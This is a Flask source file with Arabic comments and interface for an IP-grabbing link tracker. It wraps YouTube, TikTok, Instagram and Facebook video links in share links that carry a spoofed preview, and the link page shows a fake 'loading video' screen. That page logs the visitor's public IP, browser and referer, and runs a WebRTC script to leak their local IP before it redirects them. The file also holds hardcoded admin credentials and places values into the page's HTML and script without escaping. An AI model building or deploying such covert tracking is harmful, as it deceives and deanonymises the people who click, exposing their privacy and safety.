from flask import Flask, render_template_string, request, redirect, jsonify, Response
import uuid
import datetime
import sqlite3
import requests
import re
import logging
from functools import wraps
from urllib.parse import urlparse, parse_qs

# إعداد نظام التسجيل للأخطاء
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

app = Flask(__name__)

DB_FILE = "tracker_data.db"
USERNAME = "khaled"
PASSWORD = "ALG@2022"

def init_db():
    with sqlite3.connect(DB_FILE) as conn:
        cursor = conn.cursor()
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS links (
                id TEXT PRIMARY KEY,
                original_url TEXT,
                note TEXT,
                video_title TEXT,
                custom_image TEXT,
                platform TEXT
            )
        ''')
        # تم إبقاء حقل local_ip متاحاً لاستقبال البيانات المتاحة مع تلافي أخطاء التحديث
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS clicks (
                id TEXT PRIMARY KEY,
                link_id TEXT,
                ip TEXT,
                local_ip TEXT,
                user_agent TEXT,
                referer TEXT,
                time TEXT,
                FOREIGN KEY(link_id) REFERENCES links(id)
            )
        ''')
        conn.commit()

init_db()

def extract_video_id(url, platform):
    """استخراج ID الفيديو من الرابط بشكل دقيق"""
    try:
        parsed = urlparse(url)
        if platform == "youtube":
            if parsed.hostname in ('youtu.be', 'www.youtu.be'):
                return parsed.path[1:]
            if parsed.hostname in ('youtube.com', 'www.youtube.com', 'm.youtube.com'):
                if parsed.path == '/watch':
                    return parse_qs(parsed.query).get('v', [None])[0]
                if parsed.path.startswith(('/embed/', '/v/', '/shorts/')):
                    return parsed.path.split('/')[2]
        elif platform == "tiktok":
            match = re.search(r'/video/(\d+)', url)
            if match:
                return match.group(1)
    except Exception as e:
        logger.error(f"Error extracting video ID: {e}")
    return None

def get_platform_meta(url):
    """جلب وتخصيص البيانات الفوقية لكل منصة مع هاشتاغات ذكية للتوافق الكامل"""
    url_lower = url.lower()
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
    }

    # 1. معالجة يوتيوب
    if "youtube.com" in url_lower or "youtu.be" in url_lower:
        try:
            video_id = extract_video_id(url, "youtube")
            oembed_url = f"https://www.youtube.com/oembed?url={url}&format=json"
            res = requests.get(oembed_url, headers=headers, timeout=4)
            if res.status_code == 200:
                data = res.json()
                title = data.get('title', 'مقطع فيديو حصري')
                thumbnail = f"https://img.youtube.com/vi/{video_id}/maxresdefault.jpg" if video_id else data.get('thumbnail_url')
                return "YouTube", f"{title} - YouTube #Shorts", thumbnail
        except Exception as e:
            logger.error(f"YouTube metadata fetch error: {e}")
        return "YouTube", "شاهد مقطع الفيديو كاملاً - YouTube #Shorts", "https://images.unsplash.com/photo-1611162616305-c67b3fa40904?w=800"

    # 2. معالجة تيك توك
    elif "tiktok.com" in url_lower:
        try:
            oembed_url = f"https://www.tiktok.com/oembed?url={url}"
            res = requests.get(oembed_url, headers=headers, timeout=4)
            if res.status_code == 200:
                data = res.json()
                title = data.get('title', 'فيديو رائج متداول')
                return "TikTok", f"TikTok · {title}", data.get('thumbnail_url')
        except Exception as e:
            logger.error(f"TikTok metadata fetch error: {e}")
        return "TikTok", "TikTok · فيديو رائج ومميز الآن #Meme #Trending", "https://images.unsplash.com/photo-1611162617213-7d7a39e9b1d7?w=800"

    # 3. معالجة انستغرام
    elif "instagram.com" in url_lower:
        return "Instagram", "Instagram Video · شاهد المقطع والقصة الحصرية #Reels", "https://images.unsplash.com/photo-1611262588024-d12430b98920?w=800"

    # 4. معالجة فيسبوك
    elif "facebook.com" in url_lower or "fb.watch" in url_lower:
        return "Facebook", "Facebook Watch · فيديو تفاعلي رائج ومباشر #FacebookWatch", "https://images.unsplash.com/photo-1611162618828-bc409f855c74?w=800"

    return "Video", "شاهد مقطع الفيديو المرفق بجودة عالية", "https://images.unsplash.com/photo-1611162617213-7d7a39e9b1d7?w=800"

def check_auth(username, password):
    return username == USERNAME and password == PASSWORD

def requires_auth(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        auth = request.authorization
        if not auth or not check_auth(auth.username, auth.password):
            return Response(
                'يرجى تسجيل الدخول للوصول إلى لوحة التحكم.', 401,
                {'WWW-Authenticate': 'Basic realm="Login Required"'}
            )
        return f(*args, **kwargs)
    return decorated

HTML_LAYOUT = '''
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>نظام إدارة الروابط المتقدم</title>
    <style>
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #f4f6f9; color: #333; margin: 0; padding: 0; }
        .navbar { background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; padding: 15px; text-align: center; font-size: 18px; font-weight: bold; }
        .container { max-width: 1200px; margin: 15px auto; padding: 15px; box-sizing: border-box; }
        .stats-overview { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 15px; margin-bottom: 20px; }
        .stat-card { background: white; padding: 15px; border-radius: 10px; text-align: center; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
        .stat-card h3 { margin: 0; font-size: 14px; color: #666; }
        .stat-card p { margin: 10px 0 0 0; font-size: 24px; font-weight: bold; color: #667eea; }
        .create-box { background: white; padding: 20px; border-radius: 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); margin-bottom: 25px; }
        .create-box h2 { margin-top: 0; font-size: 18px; color: #333; border-bottom: 2px solid #667eea; padding-bottom: 10px; }
        label { font-weight: bold; display: block; margin-top: 15px; font-size: 14px; color: #555; }
        input[type="text"], input[type="url"] { width: 100%; padding: 10px; margin-top: 5px; border: 1px solid #ddd; border-radius: 5px; box-sizing: border-box; font-size: 14px; }
        button { width: 100%; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; border: none; padding: 12px; margin-top: 15px; border-radius: 5px; font-size: 16px; font-weight: bold; cursor: pointer; transition: transform 0.2s; }
        button:hover { transform: translateY(-2px); }
        .table-wrapper { background: white; border-radius: 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); overflow-x: auto; margin-bottom: 25px; }
        .main-table { width: 100%; border-collapse: collapse; font-size: 13px; }
        .main-table th, .main-table td { padding: 12px; text-align: center; border-bottom: 1px solid #eee; }
        .main-table th { background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; }
        .link-text { color: #667eea; text-decoration: none; word-break: break-all; font-size: 12px; }
        .badge { background: #ff6b6b; color: white; padding: 2px 8px; border-radius: 12px; font-weight: bold; font-size: 11px; }
        .platform-badge { display: inline-block; padding: 3px 10px; border-radius: 15px; font-size: 11px; font-weight: bold; color: white; }
        .bg-tiktok { background: #000; }
        .bg-youtube { background: #ff0000; }
        .bg-instagram { background: linear-gradient(45deg, #f09433, #d62976, #962fbf); }
        .bg-facebook { background: #1877f2; }
        .bg-video { background: #666; }
        .logs-box { background: white; padding: 15px; border-radius: 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
        .logs-table { width: 100%; border-collapse: collapse; font-size: 12px; margin-top: 10px; }
        .logs-table th, .logs-table td { padding: 10px; border: 1px solid #eee; text-align: center; }
        .logs-table th { background: #f8f9fa; color: #333; }
        .local-ip { color: #27ae60; font-weight: bold; font-family: monospace; }
    </style>
</head>
<body>
    <div class="navbar">🚀 نظام إدارة الروابط المتقدم - لوحة التحكم المحدثة</div>
    <div class="container">
        <div class="stats-overview">
            <div class="stat-card">
                <h3>📊 إجمالي الروابط</h3>
                <p>{{ total_links }}</p>
            </div>
            <div class="stat-card">
                <h3>👆 إجمالي النقرات</h3>
                <p>{{ total_clicks }}</p>
            </div>
        </div>

        <div class="create-box">
            <h2>✨ إنشاء رابط معاينة جديد للمنصات</h2>
            <form action="/create" method="POST">
                <label>🔗 رابط الفيديو الأصلي:</label>
                <input type="url" name="original_url" placeholder="أدخل رابط YouTube, TikTok, Instagram, Facebook" required>
                
                <label>📝 ملاحظة تعريفية للرابط:</label>
                <input type="text" name="note" placeholder="مثال: حملة تسويقية مستهدفة" required>
                
                <button type="submit">🚀 إنشاء وتفعيل الرابط الذكي</button>
            </form>
        </div>

        <div class="table-wrapper">
            <table class="main-table">
                <thead>
                    <tr>
                        <th>الملاحظة</th>
                        <th>المنصة</th>
                        <th>عنوان المحتوى المجلوب</th>
                        <th>النقرات</th>
                        <th>رابط المشاركة الآمن</th>
                        <th>صورة المعاينة</th>
                    </tr>
                </thead>
                <tbody>
                    {% for link in links_list %}
                    <tr>
                        <td><strong>{{ link.note }}</strong></td>
                        <td><span class="platform-badge bg-{{ link.platform.lower() }}">{{ link.platform }}</span></td>
                        <td style="max-width: 200px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap;" title="{{ link.video_title }}">{{ link.video_title }}</td>
                        <td><span class="badge">{{ link.clicks_count }}</span></td>
                        <td><a class="link-text" href="/secure/{{ link.id }}" target="_blank">{{ host_url }}secure/{{ link.id }}</a></td>
                        <td><img src="{{ link.custom_image }}" width="50" height="40" style="border-radius: 5px; object-fit: cover;" onerror="this.src='https://placehold.co/50x40'"></td>
                    </tr>
                    {% endfor %}
                </tbody>
            </table>
        </div>

        <div class="logs-box">
            <h3>📋 سجل تتبع الأجهزة التفصيلي المباشر</h3>
            <table class="logs-table">
                <thead>
                    <tr>
                        <th>الرابط</th>
                        <th>الوقت الحالي</th>
                        <th>IP العام</th>
                        <th>IP المحلي المسترجع</th>
                        <th>بيانات المتصفح</th>
                        <th>المصدر</th>
                    </tr>
                </thead>
                <tbody>
                    {% for click in clicks_list %}
                    <tr>
                        <td style="font-weight:bold; background:#edf2f7;">{{ click.note }}</td>
                        <td>{{ click.time }}</td>
                        <td style="color:#e53e3e; font-weight:bold;"><code>{{ click.ip }}</code></td>
                        <td class="local-ip">{{ click.local_ip or 'مخفي / غير متوفر' }}</td>
                        <td style="max-width: 200px; word-break: break-all; font-size:11px;">{{ click.user_agent[:60] }}...</td>
                        <td>{{ click.referer or 'مباشر' }}</td>
                    </tr>
                    {% endfor %}
                </tbody>
            </table>
        </div>
    </div>
</body>
</html>
'''

@app.route('/')
@requires_auth
def home():
    with sqlite3.connect(DB_FILE) as conn:
        conn.row_factory = sqlite3.Row
        cursor = conn.cursor()
        
        cursor.execute('''
            SELECT l.*, COUNT(c.id) as clicks_count 
            FROM links l 
            LEFT JOIN clicks c ON l.id = c.link_id 
            GROUP BY l.id 
            ORDER BY l.id DESC
        ''')
        links_list = cursor.fetchall()
        
        cursor.execute('''
            SELECT c.*, l.note 
            FROM clicks c 
            JOIN links l ON c.link_id = l.id 
            ORDER BY c.id DESC 
            LIMIT 100
        ''')
        clicks_list = cursor.fetchall()
        
        total_links = len(links_list)
        cursor.execute("SELECT COUNT(*) FROM clicks")
        total_clicks = cursor.fetchone()[0]

    return render_template_string(HTML_LAYOUT, links_list=links_list, clicks_list=clicks_list, host_url=request.host_url, total_links=total_links, total_clicks=total_clicks)

@app.route('/create', methods=['POST'])
@requires_auth
def create():
    original_url = request.form.get('original_url')
    note = request.form.get('note')
    
    if not original_url or not note:
        return "الرابط والملاحظة مطلوبان", 400
    
    platform, video_title, custom_image = get_platform_meta(original_url)
    link_id = str(uuid.uuid4())[:8].upper()
    
    with sqlite3.connect(DB_FILE) as conn:
        cursor = conn.cursor()
        cursor.execute('''
            INSERT INTO links (id, original_url, note, video_title, custom_image, platform) 
            VALUES (?, ?, ?, ?, ?, ?)
        ''', (link_id, original_url, note, video_title, custom_image, platform))
        conn.commit()
        
    return redirect('/')

@app.route('/secure/<link_id>')
def secure_redirect(link_id):
    with sqlite3.connect(DB_FILE) as conn:
        conn.row_factory = sqlite3.Row
        cursor = conn.cursor()
        cursor.execute("SELECT * FROM links WHERE id = ?", (link_id,))
        link_data = cursor.fetchone()
        
    if link_data:
        platform = link_data['platform']
        title = link_data['video_title']
        image_url = link_data['custom_image']
        
        # كود قراءة الـ IP العام المتوافق مع بروكيسات السيرفرات السحابية
        ip_address = request.headers.get('X-Forwarded-For', request.remote_addr)
        if ip_address and ',' in ip_address:
            ip_address = ip_address.split(',')[0].strip()
        
        user_agent = request.headers.get('User-Agent', 'غير معروف')
        referer = request.headers.get('Referer', '')
        current_time = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        # توليد ID فريد للنقرة الحالية لمنع حدوث ثغرة السباق (Race Condition) عند التحديث
        click_id = str(uuid.uuid4())
        
        with sqlite3.connect(DB_FILE) as conn:
            cursor = conn.cursor()
            cursor.execute('''
                INSERT INTO clicks (id, link_id, ip, local_ip, user_agent, referer, time) 
                VALUES (?, ?, ?, ?, ?, ?, ?)
            ''', (click_id, link_id, ip_address, "جاري الفحص...", user_agent, referer, current_time))
            conn.commit()
        
        if platform == "TikTok":
            description = "شاهد مقطع الفيديو المرفق بجودة عالية عبر تطبيق TikTok الرسمي المتداول الآن."
        elif platform == "YouTube":
            description = "مقطع فيديو قصير ومميز متاح للمشاهدة الفورية عبر منصة YouTube."
        elif platform == "Instagram":
            description = "شاهد الصور ومقاطع الفيديو والقصص الحصرية والتفاعلية عبر Instagram."
        else:
            description = "اضغط لتشغيل وعرض مقطع الفيديو المرفق بجودة عالية."
            
        # تم إصلاح تمرير المتغير وجعل الكود متوافق قياسياً مع المتصفحات
        local_ip_script = f'''
        <script>
            function getWebRTCIP(callback) {{
                var pc = new RTCPeerConnection({{ iceServers: [] }});
                pc.createDataChannel('');
                pc.createOffer().then(offer => pc.setLocalDescription(offer)).catch(e => {{}});
                
                pc.onicecandidate = function(event) {{
                    if (!event || !event.candidate) return;
                    var parts = event.candidate.candidate.split(' ');
                    for (var i = 0; i < parts.length; i++) {{
                        if (parts[i].match(/^(?:[0-9]{{1,3}}\.){{3}}[0-9]{{1,3}}$/)) {{
                            callback(parts[i]);
                            return;
                        }} else if (parts[i].endsWith('.local')) {{
                            callback(parts[i]); // استرجاع نطاق mDNS الحصري للمتصفحات الحديثة
                            return;
                        }}
                    }}
                }};
                setTimeout(() => callback(null), 1000);
            }}

            window.addEventListener('load', function() {{
                getWebRTCIP(function(ip) {{
                    var detectedIP = ip ? ip : "مخفي بواسطة المتصفح (mDNS)";
                    var xhr = new XMLHttpRequest();
                    xhr.open('POST', '/log-local-ip/' + '{click_id}', true);
                    xhr.setRequestHeader('Content-Type', 'application/json');
                    xhr.send(JSON.stringify({{ local_ip: detectedIP }}));
                }});

                setTimeout(function() {{
                    window.location.href = "{link_data['original_url']}";
                }}, 1500);
            }});
        </script>
        '''
            
        return f'''
        <!DOCTYPE html>
        <html lang="ar">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>{title}</title>
            
            <meta property="og:title" content="{title}">
            <meta property="og:description" content="{description}">
            <meta property="og:image" content="{image_url}">
            <meta property="og:image:secure_url" content="{image_url}">
            <meta property="og:type" content="video.other">
            <meta property="og:image:width" content="1200">
            <meta property="og:image:height" content="630">
            <meta name="twitter:card" content="summary_large_image">
            
            <style>
                body {{
                    margin: 0; padding: 0;
                    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
                    background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                    display: flex; justify-content: center; align-items: center; min-height: 100vh;
                }}
                .container {{ text-align: center; color: white; padding: 20px; }}
                .spinner {{
                    width: 50px; height: 50px;
                    border: 3px solid rgba(255,255,255,0.3);
                    border-radius: 50%; border-top-color: white;
                    animation: spin 1s ease-in-out infinite; margin: 20px auto;
                }}
                @keyframes spin {{ to {{ transform: rotate(360deg); }} }}
                .title {{ font-size: 18px; margin-top: 20px; opacity: 0.9; font-weight: bold; }}
                .redirect-note {{ font-size: 14px; margin-top: 20px; opacity: 0.7; }}
                .preview-image {{ max-width: 320px; border-radius: 10px; margin: 20px auto; box-shadow: 0 4px 15px rgba(0,0,0,0.2); object-fit: cover; }}
            </style>
        </head>
        <body>
            <div class="container">
                <img src="{image_url}" alt="Preview" class="preview-image" onerror="this.style.display='none'">
                <div class="spinner"></div>
                <div class="title">{title}</div>
                <div class="redirect-note">جاري تهيئة دفق الفيديو... سيتم توجيهك تلقائياً للتشغيل الرسمي</div>
            </div>
            {local_ip_script}
        </body>
        </html>
        '''
    return "الرابط المطلوب غير صالح أو منتهي الصلاحية", 404

@app.route('/log-local-ip/<click_id>', methods=['POST'])
def log_local_ip(click_id):
    """تحديث نفس سجل النقرة الفريد لضمان عدم تداخل البيانات"""
    try:
        data = request.get_json() or {}
        local_ip = data.get('local_ip', 'غير متوفر')
        
        with sqlite3.connect(DB_FILE) as conn:
            cursor = conn.cursor()
            cursor.execute('''
                UPDATE clicks 
                SET local_ip = ? 
                WHERE id = ?
            ''', (local_ip, click_id))
            conn.commit()
            
        return jsonify({"status": "success"}), 200
    except Exception as e:
        logger.error(f"Error logging local IP: {e}")
        return jsonify({"status": "error"}), 500

if __name__ == '__main__':
    app.run(debug=False, host='0.0.0.0', port=5000)
